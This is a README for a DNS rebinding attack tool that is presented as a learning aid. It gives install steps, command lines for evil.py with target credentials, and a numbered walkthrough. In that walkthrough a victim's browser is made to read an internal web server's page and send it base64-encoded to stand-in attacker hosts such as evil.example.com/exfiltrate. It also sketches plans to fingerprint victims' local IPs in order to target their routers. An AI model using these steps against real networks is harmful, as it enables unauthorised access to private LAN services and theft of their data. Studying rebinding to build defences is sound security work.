# A DNS rebinding implementation

This tool will exfiltrate data cross-domains using a DNS rebinding
attack, bypassing the browser's same-origin policy.

This is a learning tool; by using it you assume responsiblity for your
actions.

For information on the attack: https://crypto.stanford.edu/dns/dns-rebinding.pdf

## Set-up and Usage

Requirements:

 * Python (2 or 3, doesn't matter)
 * `pip`
 * `virtualenv`

Installation:

    virtualenv venv
    source venv/bin/activate
    pip install -r requirements.txt

Scenario: 

 > You want to retrieve the content of the page `target_page` from a web
 > server which is accessible only to your victim (e.g. a web server in the
 > local area network, a DSL modem/router, etc.). You know the target web
 > server's IP and that it listens on TCP port `8080`. You control the
 > `example.com` domain.

Usage:

    ./evil.py evil.example.com pingback.example.com target_page -p 8080

For help:

    ./evil.py -h

Note: this tool supports HTTP BASIC authentication. Look at the help for
the command-line options.


### Quickstart

This example uses the `/etc/hosts` file in lieu of a DNS server for
simplicity.

 1. Set your `/etc/hosts` file:

        127.0.0.1   evil.example.com
        127.0.0.1   pingback.example.com

 2. (Optional) On a *different* host, run `./target.py 8080 target_page`.
    If you do this, write down the IP of this host and call it 'target
    IP'

 2. Launch the attack:

        ./evil.py evil.example.com pingback.example.com target_page --target-username="admin" --target-password='password' -p 12345

 3. As a "victim", navigate to `http://evil.example.com:8080/evil.html`

 4. The page will try to fetch `/target_page` from `127.0.0.1` and fail.
    This is OK.

 5. Change the DNS record and point it at the target IP. Example `/etc/hosts`:

        10.1.2.3    evil.example.com  # THIS IS YOUR TARGET IP
        127.0.0.1   pingback.example.com

 6. After a short timeout (up to a minute) the evil script will now fetch `target_page` from `10.1.2.3`

 7. When some data has been acquired, the evil script will ping back to
    `http://pingback.example.com:8080/gotstuff`. If you open the
    console, you'll see that the browser is blocking reading the
    response due to CORS and SOP; it's OK, we only needed to know when
    this happens.

 8. Switch the `hosts` file back:

        127.0.0.1   evil.example.com
        127.0.0.1   pingback.example.com

 9. After a short interval the evil script will send the data read from
    `target_page` to
    `http://evil.example.com:8080/exfiltrate?e=<base64-encoded data>`
    and terminate.

 10. The acquired data is saved base64-encoded in `out.txt`. To decode:
     `base64 -d out.txt`


# TODOs

 * Run a DNS server in the script so that the records can be
   programmatically changed without having to edit `/etc/hosts` by hand
 * Try HTTPS
 * Use AWS Route 53 APIs to set DNS records if port 53 is not available
   or don't want to use the local DNS server:
   https://docs.aws.amazon.com/Route53/latest/APIReference/API_ChangeResourceRecordSets.html
 * Test with cookies
 * Test CNAME aliases to alter the `Host:` header when making
   cross-domain requests
 * How low can DNS records TTL be before a browser refreshes?

# Ideas for the future

 * Make it multi-tenant
 * Try websockets
 * Acquire the local IP of the victim via RTC and guess the default gateway: see http://net.ipcalf.com/

In more details:

 1. Victim visits `http://$random.evil.com/evil.html`. That is a DNS
    wildcard and always returns the attacker's IP
 2. The `evil.js` script returns the victim's local IP to
    `http://pingback.evil.com/local_ip?i=192.168.0.23`
 3. The tool switches `$random.evil.com` to e.g. `192.168.0.1` based on
    the local IP of the victim
 4. Attack proceeds as before
 5. When data has been acquired, `evil.js` pings
    `pingback.evil.com/pingback?random=$random`. The tool switches the
    DNS record for `$random.evil.com` is re-set to the attacker's IP
 6. Data is exfiltrated as before

Pros:

 * Multiple attacks at the same time, useful for probing multiple
   services on a network

Cons:

 * Tricky

# Other files

 * `target.py`: simple script to use on another host as PoC.

If you want to use python's HTTP server:

   * `python2 -m SimpleHTTPServer <port>`
   * `python3 -m http.server <port>`

Note: you'll need to create a file in the directory where you run the
PoC so that `GET /secret_file` will return something.
